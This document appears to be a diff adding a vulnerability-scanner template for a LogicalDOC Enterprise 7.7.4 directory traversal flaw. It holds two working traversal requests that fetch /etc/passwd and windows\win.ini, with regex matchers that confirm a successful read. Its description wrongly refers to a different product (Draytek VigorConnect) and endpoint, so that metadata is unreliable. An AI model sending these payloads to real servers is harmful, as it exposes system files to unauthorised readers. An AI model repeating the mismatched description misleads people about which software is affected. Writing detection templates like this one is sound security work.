@@ -1,0 +1,30 @@
+id: logicaldoc-directory-traversal
+
+info:
+  name: LogicalDOC Enterprise 7.7.4 - Directory Traversal
+  author: 0x_Akoko
+  severity: high
+  description: A local file inclusion vulnerability exists in Draytek VigorConnect 1.6.0-B3 in the file download functionality of the DownloadFileServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.
+  reference:
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5450.php
+    - https://packetstormsecurity.com/files/146352
+  tags: logicaldoc,lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/convertpdf?docId=2450&control=preview&fileVersion=../../../../../../etc/passwd"
+      - "{{BaseURL}}/thumbnail?docId=3375114&random=1517220341243&suffix=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "for 16-bit app support"
+        condition: or
+
+      - type: status
+        status:
+          - 200
